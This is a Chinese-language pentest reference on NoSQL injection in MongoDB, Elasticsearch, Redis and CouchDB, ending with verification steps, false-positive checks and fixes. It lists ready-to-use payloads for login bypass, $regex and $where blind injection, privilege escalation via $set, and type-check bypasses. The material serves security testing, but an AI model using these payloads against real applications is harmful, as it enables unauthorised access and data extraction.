# NoSQL 注入

> 当后端把 JSON/BSON 直接用于查询（MongoDB、CouchDB、Elasticsearch、Redis 命令拼接）时，**结构本身成了注入面**。

## 一、MongoDB 操作符注入

```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}
```

- 前提：后端直接 `find(req.body)` 或没有做类型校验（把对象当字符串用）。
- 登录绕过、盲注（`$regex` 逐字符）、`$where`（JS 执行，弱口令/禁用前）。
- `$where`：`{"$where": "this.password.match(/^a/)"}` —— 可做时间盲注：`"sleep(5000)||1"`。

## 二、常见入口

| 位置 | 说明 |
|---|---|
| 登录表单 | `Content-Type: application/json` + `{"password":{"$ne":1}}` |
| 搜索/过滤 | `?q[$gt]=` 之类的 query 解析（qs 的深度解析） |
| 排序/分页参数 | `?sort=password` 或 `$orderby` |
| 更新操作 | `{"$set": {"role":"admin"}}`（批量赋值+操作符注入） |
| 认证中间件 | session 存储为 BSON 时篡改 |

## 三、NoSQL 之外的"类注入"

- **Elasticsearch**：`_search` 的 DSL 注入、脚本字段（`painless`）执行、`_bulk` 越权、无认证的 9200。
- **Redis**：拼接命令 → `\r\n` 注入（配合 SSRF/gopher 可写文件/改配置 → RCE）。
- **CouchDB**：`_all_docs`、`_users`、临时视图 JS。
- **Cassandra CQL**：字符串拼接 → `ALLOW FILTERING`、批量注入（见 `../SQL Injection/Cassandra Injection.md`）。
- **Neo4j Cypher**、**InfluxDB InfluxQL** 同族。

## 四、绕过类型校验

- 参数污染：`username=admin&username[$ne]=1`。
- 类型强转：`{"id": {"toString": ...}}`、`{"id": ["1","2"]}`。
- 原型污染组合：污染 `Object.prototype` 使 `$ne` 生效（Node 端）。
- 编码：`%24ne`（`$ne`）、`{"\u0024ne": null}`。
- 数组/对象混用：`{"password": ["x"]}`。

## 五、验证（最小证据）

1. 请求原文与响应差异（正常错误 vs 绕过成功）。
2. 登录绕过：以目标身份返回会话/受保护数据。
3. 盲注：用 `$regex` 或 `$where` 时间盲注，多次采样给出逐字符结果。
4. 记录后端类型（Mongo/ES/Redis）与入口参数。

## 六、常见误报

- 引入 `$ne` 后返回 500（解析错误，未生效）。
- 后端已强制 `typeof === "string"` 校验。
- 用 `$where` 但服务端禁用脚本（报 `$where is not allowed`）。
- 查询"成功"但返回空数组。

## 七、修复

- 严格类型与 schema 校验（拒绝对象出现在字符串字段）；使用 ODM/驱动（Mongoose 的 schema 校验）并开启 `strictQuery`。
- 禁止 `$where`/`$function`/服务端脚本；限制可用操作符白名单。
- 参数化/类型化查询；拒绝深层对象参数（`qs` 限制 `depth`）。
- 数据存储不用于认证比较（密码哈希比对而非查询匹配）。
- ES/Redis 等中间件强制认证 + 网络隔离。

## 参考

- OWASP：Testing for NoSQL Injection（WSTG）
- PayloadsAllTheThings：NoSQL Injection
